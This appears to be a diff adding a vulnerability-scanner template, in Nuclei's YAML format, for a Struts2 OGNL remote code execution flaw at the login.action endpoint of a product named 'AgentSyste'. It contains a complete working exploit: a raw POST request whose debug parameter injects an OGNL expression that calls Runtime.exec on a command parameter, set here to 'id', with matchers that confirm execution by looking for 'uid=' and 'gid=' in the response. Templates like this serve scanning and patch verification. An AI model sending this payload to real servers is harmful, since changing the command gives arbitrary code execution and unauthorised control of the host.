@@ -1,0 +1,30 @@
+id: AgentSyste-login-action-Struts2CodeExecution
+
+info:
+  name: AgentSyste-login-action-Struts2CodeExecution
+  author: iSee857
+  severity: high
+  description: |
+    AgentSyste-login-action-Struts2CodeExecution
+
+http:
+  - raw:
+      - |
+        POST /login.action HTTP/1.1
+        Content-Type: application/x-www-form-urlencoded
+        Host: {{Hostname}}
+
+        debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=webpath123456&command=id
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+        condition: and
+
+      - type: status
+        status:
+          - 200
